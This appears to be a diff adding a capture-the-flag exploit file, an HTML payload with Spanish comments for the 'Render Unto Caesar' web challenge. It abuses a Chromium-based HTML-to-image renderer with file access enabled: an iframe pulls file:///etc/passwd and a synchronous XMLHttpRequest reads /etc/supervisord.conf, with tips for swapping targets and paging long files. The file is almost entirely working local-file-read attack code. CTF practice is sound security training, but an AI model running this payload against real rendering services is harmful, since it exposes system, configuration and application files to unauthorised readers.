@@ -1,0 +1,28 @@
+<!--
+  Render Unto Caesar (Fluid Attacks CTF 2026, Web, Hard) -- ETAPA 1: LFI via HTML->JPEG.
+  El servicio renderiza HTML a imagen con Chromium --allow-file-access-from-files.
+  Enviar este HTML al render; el contenido leido aparece en el thumbnail devuelto.
+  - <iframe file://> lee archivos que Chromium renderiza (passwd, /proc/self/cwd).
+  - Para archivos que Chromium DESCARGA (.sh/.conf): XHR sincrono desde el doc renderizado.
+  Cambiar TARGET por el archivo a leer. Para archivos largos: margin-top negativo pagina el iframe.
+-->
+<!doctype html><html><head><meta charset="utf-8">
+<style>body{margin:0;font:14px monospace;white-space:pre-wrap}#p{overflow:hidden;height:700px}iframe{width:1280px;height:2000px;border:0;margin-top:0}</style>
+</head><body>
+<div id="out">[*] LFI render</div>
+<!-- LFI directo (archivos que Chromium muestra): -->
+<div id="p"><iframe src="file:///etc/passwd"></iframe></div>
+
+<!-- LFI de archivos que Chromium descargaria (.sh/.conf): XHR sincrono -->
+<script>
+  var TARGET = "file:///etc/supervisord.conf";   // <- cambiar (ej. /proc/self/cwd/app.js)
+  try {
+    var x = new XMLHttpRequest();
+    x.open("GET", TARGET, false);   // sincrono: se resuelve antes del SETTLE del render
+    x.send();
+    document.getElementById("out").textContent = x.responseText;
+  } catch (e) {
+    document.getElementById("out").textContent = "ERR: " + e;
+  }
+</script>
+</body></html>
